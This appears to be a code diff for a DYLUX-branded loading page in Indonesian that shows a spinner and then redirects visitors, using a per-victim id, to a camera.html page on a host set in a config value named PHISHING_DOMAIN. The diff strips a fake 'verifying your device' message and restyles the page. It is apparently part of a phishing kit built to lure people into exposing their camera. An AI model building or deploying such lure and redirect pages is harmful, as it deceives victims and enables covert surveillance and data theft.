@@ -9,89 +9,44 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0f;
-            font-family: 'Inter', -apple-system, sans-serif;
+            font-family: Arial, sans-serif;
+            color: #e0e0ff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #e0e0ff;
         }
-        .container {
-            text-align: center;
-            padding: 40px;
-            max-width: 500px;
-        }
+        .container { text-align: center; padding: 40px; }
         .logo {
             font-size: 48px;
             font-weight: 800;
             background: linear-gradient(135deg, #00f0ff, #7b2ffc);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 16px;
-        }
-        .sub {
-            font-size: 14px;
-            color: #8888aa;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            margin-bottom: 24px;
-        }
-        .card {
-            background: #14141e;
-            border: 1px solid rgba(0,240,255,0.1);
-            border-radius: 16px;
-            padding: 32px;
-            margin-bottom: 24px;
-        }
-        .card h2 {
-            font-size: 20px;
-            margin-bottom: 8px;
-        }
-        .card p {
-            color: #8888aa;
-            font-size: 14px;
-            line-height: 1.6;
         }
         .loader {
-            display: inline-block;
             width: 40px;
             height: 40px;
             border: 3px solid rgba(0,240,255,0.1);
             border-top-color: #00f0ff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 16px auto;
+            margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .footer {
-            font-size: 12px;
-            color: #555577;
-            margin-top: 16px;
-        }
-        .footer a { color: #00f0ff; text-decoration: none; }
+        .sub { color: #8888aa; font-size: 14px; margin-top: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">DYLUX</div>
+        <div class="loader"></div>
         <div class="sub">Cahaya dalam Kegelapan</div>
-        
-        <div class="card">
-            <div class="loader"></div>
-            <h2>Sedang Memproses...</h2>
-            <p>Harap tunggu, sistem sedang memverifikasi perangkat Anda.</p>
-        </div>
-        
-        <div class="footer">
-            &copy; 2026 <a href="#">DYLUX</a> • Powered by <a href="#">KazzahOffc</a>
-        </div>
     </div>
-    
     <script>
-        // Auto redirect setelah 2 detik
+        // Redirect ke camera.html setelah 2 detik
         setTimeout(() => {
-            const params = new URLSearchParams(window.location.search);
-            const id = params.get('id');
+            const id = new URLSearchParams(window.location.search).get('id');
             if (id) {
                 window.location.href = `${DYLUX_CONFIG.PHISHING_DOMAIN}/camera.html?id=${id}`;
             }
